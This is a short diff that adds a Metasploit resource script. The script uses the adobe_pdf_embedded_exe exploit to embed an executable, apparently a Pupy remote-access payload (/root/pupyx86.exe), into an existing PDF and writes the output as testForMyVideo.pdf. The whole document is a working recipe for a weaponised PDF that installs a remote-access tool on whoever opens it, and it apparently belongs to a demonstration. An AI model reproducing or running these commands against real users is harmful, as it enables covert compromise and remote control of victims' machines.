@@ -1,0 +1,5 @@
+use exploit/windows/fileformat/adobe_pdf_embedded_exe
+set EXENAME /root/pupyx86.exe
+set INFILENAME /root/Desktop/dnshijackingexample.pdf
+set FILENAME testForMyVideo.pdf
+run
